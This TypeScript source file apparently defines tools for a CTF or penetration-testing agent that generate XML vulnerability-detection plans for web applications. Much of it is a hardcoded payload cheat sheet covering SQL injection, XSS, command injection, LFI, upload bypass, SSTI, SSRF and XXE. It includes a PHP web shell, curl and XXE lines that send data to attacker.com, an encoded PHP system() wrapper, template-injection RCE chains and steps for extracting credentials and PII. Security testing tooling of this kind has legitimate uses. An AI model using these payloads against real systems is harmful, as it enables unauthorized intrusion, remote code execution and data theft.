import type { Tool, ToolDefinition, ToolResult } from '../core/types.js'
import { TOOL_METADATA } from '../core/toolMetadata.js'
import type { CTFToolMetadata } from '../core/toolDefinition.js'

type VulnType =
  'SQLI' | 'XSS' | 'IDOR' | 'LFI' | 'CMD' | 'UPLOAD' | 'SSTI' | 'SSRF' | 'XXE' | 'OTHER'

function makeVulnTool(
  name: string,
  description: string,
  parameters: unknown,
  handler: (input: Record<string, unknown>) => ToolResult,
  _metadata: CTFToolMetadata,
): Tool {
  return {
    name,
    definition: {
      type: 'function',
      function: { name, description, parameters },
    } as ToolDefinition,
    // eslint-disable-next-line @typescript-eslint/require-await
    execute: async (input) => handler(input),
    concurrencySafe: true,
  }
}

function planVulnDetection(input: Record<string, unknown>): ToolResult {
  const url = typeof input.url === 'string' ? input.url : ''
  const responseBody = typeof input.responseBody === 'string' ? input.responseBody : ''
  const responseHeaders = typeof input.responseHeaders === 'string' ? input.responseHeaders : ''
  const technology = typeof input.technology === 'string' ? input.technology : 'unknown'

  const bodyPreview = responseBody.slice(0, 2000)
  const headerPreview = responseHeaders.slice(0, 1000)

  const indicators: string[] = []
  const lowerBody = responseBody.toLowerCase()
  const lowerHeaders = responseHeaders.toLowerCase()

  if (
    lowerBody.includes('sql') ||
    lowerBody.includes('mysql') ||
    lowerBody.includes('oracle') ||
    lowerBody.includes('postgres')
  ) {
    indicators.push('SQL-related strings detected in response')
  }
  if (lowerBody.includes('<script') || lowerBody.includes('javascript:')) {
    indicators.push('JavaScript content detected in response')
  }
  if (lowerBody.includes('upload') || lowerBody.includes('multipart')) {
    indicators.push('File upload functionality detected')
  }
  if (lowerHeaders.includes('x-powered-by: php')) {
    indicators.push('PHP backend detected')
  }
  if (
    lowerHeaders.includes('x-powered-by: express') ||
    lowerHeaders.includes('x-powered-by: next')
  ) {
    indicators.push('Node.js backend detected')
  }
  if (lowerHeaders.includes('server: apache') || lowerHeaders.includes('server: nginx')) {
    indicators.push(
      `${responseHeaders.match(/server:\s*([^\r\n]+)/i)?.[1] ?? 'Web server'} detected`,
    )
  }
  if (
    lowerBody.includes('csrf') ||
    lowerBody.includes('_token') ||
    lowerBody.includes('csrftoken')
  ) {
    indicators.push('CSRF protection present')
  }

  const xml = `<?xml version="1.0" encoding="UTF-8"?>
<vuln_detection_plan>
  <target>
    <url>${escapeXml(url)}</url>
    <technology>${escapeXml(technology)}</technology>
  </target>
  <observations>
    ${indicators.length > 0 ? indicators.map((i) => `<indicator>${escapeXml(i)}</indicator>`).join('\n    ') : '<indicator>No immediate indicators found</indicator>'}
  </observations>
  <response_headers_preview>${escapeXml(headerPreview)}</response_headers_preview>
  <response_body_preview>${escapeXml(bodyPreview)}</response_body_preview>
  <recommended_checks>
    <check priority="high" category="injection">
      <name>SQL Injection</name>
      <method>Inject single quotes, boolean conditions, and time delays into all parameters</method>
      <payloads>
        <payload>'</payload>
        <payload>" OR 1=1--</payload>
        <payload>1' AND SLEEP(5)--</payload>
        <payload>1 UNION SELECT NULL--</payload>
      </payloads>
      <verification>Observe error messages, response time differences, or data leakage</verification>
    </check>
    <check priority="high" category="injection">
      <name>Cross-Site Scripting (XSS)</name>
      <method>Inject script tags and event handlers into reflected parameters</method>
      <payloads>
        <payload>&lt;script&gt;alert(1)&lt;/script&gt;</payload>
        <payload>&lt;img src=x onerror=alert(1)&gt;</payload>
        <payload>" onload="alert(1)</payload>
        <payload>javascript:alert(1)</payload>
      </payloads>
      <verification>Check if payload is reflected unescaped in HTML context</verification>
    </check>
    <check priority="high" category="injection">
      <name>Command Injection</name>
      <method>Inject OS command separators into parameters passed to system commands</method>
      <payloads>
        <payload>; id</payload>
        <payload>| cat /etc/passwd</payload>
        <payload>&amp;&amp; whoami</payload>
        <payload>$(whoami)</payload>
      </payloads>
      <verification>Observe command output in response or use time-based detection</verification>
    </check>
    <check priority="medium" category="access_control">
      <name>Insecure Direct Object Reference (IDOR)</name>
      <method>Enumerate resource IDs and test access controls</method>
      <payloads>
        <payload>Change id=1 to id=2</payload>
        <payload>Change user=alice to user=bob</payload>
        <payload>Add admin=true parameter</payload>
      </payloads>
      <verification>Access resources belonging to other users without authorization</verification>
    </check>
    <check priority="medium" category="injection">
      <name>Local File Inclusion (LFI)</name>
      <method>Test file path parameters for directory traversal</method>
      <payloads>
        <payload>../../../etc/passwd</payload>
        <payload>....//....//etc/passwd</payload>
        <payload>%2e%2e%2f%2e%2e%2fetc%2fpasswd</payload>
        <payload>php://filter/convert.base64-encode/resource=index.php</payload>
      </payloads>
      <verification>Read sensitive system files or application source code</verification>
    </check>
    <check priority="medium" category="file_upload">
      <name>File Upload Bypass</name>
      <method>Test upload restrictions with various file types and names</method>
      <payloads>
        <payload>shell.php.jpg (double extension)</payload>
        <payload>shell.PhP (case variation)</payload>
        <payload>GIF89a; followed by PHP code</payload>
        <payload>Content-Type: image/jpeg with PHP content</payload>
      </payloads>
      <verification>Upload executable file and access it via web server</verification>
    </check>
    <check priority="medium" category="injection">
      <name>Server-Side Template Injection (SSTI)</name>
      <method>Inject template expressions into user-controlled fields</method>
      <payloads>
        <payload>{{7*7}}</payload>
        <payload>${7 * 7}</payload>
        <payload>&lt;%= 7*7 %&gt;</payload>
        <payload>{{config}}</payload>
      </payloads>
      <verification>Check if expression is evaluated (49 in response)</verification>
    </check>
    <check priority="medium" category="injection">
      <name>Server-Side Request Forgery (SSRF)</name>
      <method>Test URL parameters for internal resource access</method>
      <payloads>
        <payload>http://127.0.0.1:22</payload>
        <payload>http://localhost/admin</payload>
        <payload>http://169.254.169.254/latest/meta-data/</payload>
        <payload>file:///etc/passwd</payload>
      </payloads>
      <verification>Access internal services or cloud metadata endpoints</verification>
    </check>
    <check priority="low" category="injection">
      <name>XML External Entity (XXE)</name>
      <method>Inject entity declarations in XML input</method>
      <payloads>
        <payload>&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;</payload>
        <payload>&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "http://attacker.com/"&gt;]&gt;</payload>
      </payloads>
      <verification>Read local files or make outbound requests from server</verification>
    </check>
  </recommended_checks>
  <next_steps>
    <step>1. Test high-priority checks first based on observed indicators</step>
    <step>2. Use detect_vuln_type tool for detailed methodology on promising vectors</step>
    <step>3. Document findings with emit_finding tool</step>
  </next_steps>
</vuln_detection_plan>`

  return { isError: false, content: xml }
}

function detectVulnType(input: Record<string, unknown>): ToolResult {
  const vulnType = (
    typeof input.vulnType === 'string' ? input.vulnType.toUpperCase() : 'OTHER'
  ) as VulnType
  const requestInfo = typeof input.requestInfo === 'string' ? input.requestInfo : ''
  const responseInfo = typeof input.responseInfo === 'string' ? input.responseInfo : ''

  const methodologies: Record<
    VulnType,
    { name: string; steps: string[]; payloads: string[]; verification: string[] }
  > = {
    SQLI: {
      name: 'SQL Injection Detection',
      steps: [
        'Identify all input parameters (GET, POST, Cookie, HTTP headers)',
        "Test each parameter with single quote (') and observe error responses",
        'Determine database type from error messages (MySQL, PostgreSQL, MSSQL, Oracle, SQLite)',
        'Test boolean-based blind: parameter AND 1=1 vs AND 1=2',
        'Test time-based blind: parameter AND SLEEP(5) (MySQL) or WAITFOR DELAY (MSSQL)',
        'Determine column count with ORDER BY 1, ORDER BY 2, ... until error',
        'Attempt UNION-based extraction with matching column count',
        'Extract database version, current user, and database name',
        'Enumerate tables and columns from information_schema',
        'Extract sensitive data (credentials, flags, PII)',
      ],
      payloads: [
        "' OR '1'='1",
        "' OR 1=1--",
        "1' UNION SELECT NULL,NULL,NULL--",
        "1' AND SLEEP(5)--",
        "1' AND (SELECT COUNT(*) FROM users)>0--",
        "'; WAITFOR DELAY '0:0:5'--",
        '1 AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--',
      ],
      verification: [
        'Error messages reveal database structure',
        'Response time differs with time-based payloads',
        'UNION query returns extracted data',
        'Boolean conditions change response content',
      ],
    },
    XSS: {
      name: 'Cross-Site Scripting Detection',
      steps: [
        'Identify all reflection points where user input appears in response',
        'Determine context: HTML body, attribute value, JavaScript string, URL',
        'Test basic script tag injection: <script>alert(1)</script>',
        'Test event handler injection in attribute contexts',
        'Test protocol handlers: javascript:alert(1)',
        'Check for output encoding/escaping mechanisms',
        'Attempt context-specific bypasses',
        'Verify if payload executes in browser (use Burp Collaborator or interactsh)',
      ],
      payloads: [
        '<script>alert(document.domain)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '" onmouseover="alert(1)',
        "' onfocus='alert(1)' autofocus='",
        'javascript:alert(1)',
        '<details open ontoggle=alert(1)>',
        '<input onfocus=alert(1) autofocus>',
      ],
      verification: [
        'Alert box appears in browser',
        'Payload reflected without encoding',
        'JavaScript executes in reflected context',
        'Out-of-band callback received (for blind XSS)',
      ],
    },
    IDOR: {
      name: 'Insecure Direct Object Reference Detection',
      steps: [
        'Identify all resource identifiers (IDs, usernames, UUIDs)',
        'Create two test accounts if possible',
        'Access resource as user A, note the identifier',
        'Attempt to access same resource as user B',
        'Enumerate sequential IDs (1, 2, 3, ...) and check access',
        'Test GUIDs/UUIDs for predictability',
        'Check if role parameters can be modified (user -> admin)',
        'Test indirect references (change user_id in session/token)',
      ],
      payloads: [
        'Change id=100 to id=101',
        'Change /users/alice to /users/bob',
        'Add role=admin parameter',
        'Change account_id in JWT payload',
        'Access /admin/endpoint as regular user',
      ],
      verification: [
        'Access resources belonging to other users',
        'Modify data of other users',
        'Escalate privileges via parameter manipulation',
        'Bypass authorization checks',
      ],
    },
    LFI: {
      name: 'Local File Inclusion Detection',
      steps: [
        'Identify file path parameters (page, file, include, template, path)',
        'Test basic directory traversal: ../../../etc/passwd',
        'Test alternative traversal sequences: ....//....//',
        'Test URL-encoded traversal: %2e%2e%2f',
        'Test double URL encoding: %252e%252e%252f',
        'Test null byte truncation: ../../../etc/passwd%00 (PHP < 5.3.4)',
        'Test PHP wrappers: php://filter/convert.base64-encode/resource=index.php',
        'Test data:// and input:// wrappers',
        'Attempt log poisoning for RCE via LFI',
      ],
      payloads: [
        '../../../etc/passwd',
        '....//....//....//etc/passwd',
        '..%2f..%2f..%2fetc%2fpasswd',
        '..%252f..%252f..%252fetc%252fpasswd',
        'php://filter/convert.base64-encode/resource=../index.php',
        '/proc/self/environ',
        '/var/log/apache2/access.log',
        'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+',
      ],
      verification: [
        'System file contents returned (e.g., /etc/passwd)',
        'Application source code disclosed',
        'Environment variables leaked via /proc/self/environ',
        'Code execution via log poisoning or PHP wrappers',
      ],
    },
    CMD: {
      name: 'Command Injection Detection',
      steps: [
        'Identify parameters passed to system commands (ping, nslookup, traceroute, convert)',
        'Test command separators: ; | && || \\n',
        'Test subshell execution: $() and ``',
        'Test time-based blind: ; sleep 5',
        'Test out-of-band: ; curl http://collaborator.com/',
        'Bypass filters with space alternatives: ${IFS}, $IFS, <, >',
        'Bypass filters with concatenation: c\'a\'t, c"a"t',
        'Use wildcards: /???/??t /???/p??s??',
      ],
      payloads: [
        '; id',
        '| cat /etc/passwd',
        '&& whoami',
        '$(whoami)',
        '`id`',
        '; sleep 10',
        '; curl http://attacker.com/$(whoami)',
        ';cat${IFS}/etc/passwd',
        ";c'a't /etc/passwd",
        '/???/??t /???/p??s??',
      ],
      verification: [
        'Command output appears in response',
        'Response delayed with sleep payload',
        'Out-of-band callback received',
        'System file contents returned',
      ],
    },
    UPLOAD: {
      name: 'File Upload Vulnerability Detection',
      steps: [
        'Identify upload endpoints and allowed file types',
        'Test upload with disallowed extension (.php, .jsp, .aspx)',
        'Test double extensions: shell.php.jpg',
        'Test case variations: shell.PhP, shell.JsP',
        'Test Content-Type header manipulation',
        'Test magic byte spoofing (prepend GIF89a; to PHP)',
        'Test null byte in filename: shell.php%00.jpg',
        'Check if uploaded file is executed or served as static',
        'Attempt to upload .htaccess to change handler',
        'Test race condition: access before validation completes',
      ],
      payloads: [
        'shell.php with Content-Type: image/jpeg',
        'shell.php.jpg (double extension)',
        'shell.PhP (case variation)',
        'GIF89a;<?php system($_GET["cmd"]); ?>',
        'shell.php%00.jpg (null byte)',
        '.htaccess with: AddType application/x-httpd-php .jpg',
      ],
      verification: [
        'Uploaded PHP file executes when accessed',
        'Web shell provides command execution',
        'File is accessible at predictable URL',
        'Server interprets uploaded file as code',
      ],
    },
    SSTI: {
      name: 'Server-Side Template Injection Detection',
      steps: [
        'Identify user input rendered in template output',
        'Test template expressions: {{7*7}}, ${7*7}, <%= 7*7 %>',
        'Determine template engine from response (Jinja2, Twig, Freemarker, etc.)',
        'Test engine-specific payloads for code execution',
        'Attempt to access application config and environment',
        'Escalate from template injection to RCE',
      ],
      payloads: [
        '{{7*7}}',
        '${7*7}',
        '<%= 7*7 %>',
        '{{config.items()}}',
        '{{self.__init__.__globals__.__builtins__.__import__("os").popen("id").read()}}',
        '${T(java.lang.Runtime).getRuntime().exec("id")}',
        '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}',
      ],
      verification: [
        'Math expression evaluated (49 in response)',
        'Application config exposed',
        'OS command output returned',
        'Template engine error reveals internals',
      ],
    },
    SSRF: {
      name: 'Server-Side Request Forgery Detection',
      steps: [
        'Identify URL parameters passed to server-side HTTP clients',
        'Test with external callback URL (Burp Collaborator, interactsh)',
        'Test internal IP ranges: 127.0.0.1, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16',
        'Test cloud metadata: http://169.254.169.254/',
        'Test alternative representations: 0x7f000001, 2130706433, 0177.0.0.1',
        'Test protocol handlers: file://, gopher://, dict://',
        'Bypass filters with DNS rebinding or open redirect',
        'Attempt to access internal services (Redis, Elasticsearch, etc.)',
      ],
      payloads: [
        'http://127.0.0.1:22',
        'http://localhost:80/admin',
        'http://169.254.169.254/latest/meta-data/',
        'http://[::1]/',
        'file:///etc/passwd',
        'gopher://127.0.0.1:6379/_INFO%0d%0a',
        'http://0x7f000001/',
        'http://2130706433/',
      ],
      verification: [
        'Internal service response received',
        'Cloud metadata returned (AWS/GCP/Azure)',
        'Out-of-band callback from internal host',
        'File contents read via file:// protocol',
      ],
    },
    XXE: {
      name: 'XML External Entity Detection',
      steps: [
        'Identify XML input endpoints (SOAP, REST with XML, file imports)',
        'Test basic entity declaration',
        'Test external entity with file:// protocol',
        'Test external entity with http:// protocol (out-of-band)',
        'Test parameter entities for blind XXE',
        'Test XInclude for non-DTD contexts',
        'Check if XML parser processes external entities',
      ],
      payloads: [
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><root>&xxe;</root>',
        '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]><root>test</root>',
        '<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd"/></root>',
      ],
      verification: [
        'File contents returned in response',
        'Out-of-band HTTP request received',
        'Error message reveals file contents',
        'Blind XXE exfiltrates data via out-of-band channel',
      ],
    },
    OTHER: {
      name: 'General Vulnerability Detection',
      steps: [
        'Enumerate all endpoints and parameters',
        'Test for common misconfigurations (debug mode, default credentials)',
        'Check information disclosure (error messages, stack traces, version strings)',
        'Test authentication and authorization bypass',
        'Test session management weaknesses',
        'Check for security headers (CSP, HSTS, X-Frame-Options)',
        'Test for business logic flaws',
      ],
      payloads: [
        'admin:admin, admin:password, root:root',
        '/debug, /admin, /console, /phpinfo.php',
        'Authorization: Bearer <empty>',
        'Cookie manipulation',
        'HTTP method tampering (PUT, DELETE, PATCH)',
      ],
      verification: [
        'Default credentials accepted',
        'Debug endpoints accessible',
        'Sensitive information disclosed',
        'Authorization bypassed',
      ],
    },
  }

  const method = methodologies[vulnType] ?? methodologies.OTHER

  const xml = `<?xml version="1.0" encoding="UTF-8"?>
<vuln_detection_methodology>
  <type>${escapeXml(vulnType)}</type>
  <name>${escapeXml(method.name)}</name>
  <context>
    <request_info>${escapeXml(requestInfo.slice(0, 2000))}</request_info>
    <response_info>${escapeXml(responseInfo.slice(0, 2000))}</response_info>
  </context>
  <steps>
    ${method.steps.map((s, i) => `<step order="${i + 1}">${escapeXml(s)}</step>`).join('\n    ')}
  </steps>
  <payloads>
    ${method.payloads.map((p) => `<payload>${escapeXml(p)}</payload>`).join('\n    ')}
  </payloads>
  <verification>
    ${method.verification.map((v) => `<criterion>${escapeXml(v)}</criterion>`).join('\n    ')}
  </verification>
  <recommendations>
    <recommendation>Start with non-destructive tests (information gathering)</recommendation>
    <recommendation>Document all requests and responses for evidence</recommendation>
    <recommendation>Use emit_finding to record confirmed vulnerabilities</recommendation>
    <recommendation>Consider impact and exploitability before deep exploitation</recommendation>
  </recommendations>
</vuln_detection_methodology>`

  return { isError: false, content: xml }
}

function escapeXml(s: string): string {
  return s
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&apos;')
}

function planVulnDetectionTool(): Tool {
  return makeVulnTool(
    'plan_vuln_detection',
    'Generate a structured XML vulnerability detection plan based on target URL, response body, headers, and detected technology. Returns prioritized checks with payloads and verification methods.',
    {
      type: 'object',
      properties: {
        url: { type: 'string', description: 'Target URL to analyze' },
        responseBody: { type: 'string', description: 'HTTP response body content' },
        responseHeaders: { type: 'string', description: 'HTTP response headers' },
        technology: {
          type: 'string',
          description: 'Detected technology stack (PHP, Python, Java, Node.js, etc.)',
        },
      },
      required: ['url', 'responseBody', 'responseHeaders'],
    },
    planVulnDetection,
    {
      domains: ['web'],
      executionMode: 'foreground',
      costClass: 'cheap',
      outputMode: 'inline',
      riskLevel: 'low',
    },
  )
}

TOOL_METADATA['plan_vuln_detection'] = {
  domains: ['web'],
  executionMode: 'foreground',
  costClass: 'cheap',
  outputMode: 'inline',
  riskLevel: 'low',
}

function detectVulnTypeTool(): Tool {
  return makeVulnTool(
    'detect_vuln_type',
    'Generate a detailed detection methodology for a specific vulnerability type. Returns step-by-step procedure, payloads, and verification criteria.',
    {
      type: 'object',
      properties: {
        vulnType: {
          type: 'string',
          enum: ['SQLI', 'XSS', 'IDOR', 'LFI', 'CMD', 'UPLOAD', 'SSTI', 'SSRF', 'XXE', 'OTHER'],
          description: 'Vulnerability type to detect',
        },
        requestInfo: {
          type: 'string',
          description: 'Information about the HTTP request (method, URL, parameters, headers)',
        },
        responseInfo: {
          type: 'string',
          description: 'Information about the HTTP response (status, body, headers)',
        },
      },
      required: ['vulnType'],
    },
    detectVulnType,
    {
      domains: ['web'],
      executionMode: 'foreground',
      costClass: 'cheap',
      outputMode: 'inline',
      riskLevel: 'low',
    },
  )
}

TOOL_METADATA['detect_vuln_type'] = {
  domains: ['web'],
  executionMode: 'foreground',
  costClass: 'cheap',
  outputMode: 'inline',
  riskLevel: 'low',
}

export function createVulnDetectionTools(): Tool[] {
  return [planVulnDetectionTool(), detectVulnTypeTool()]
}
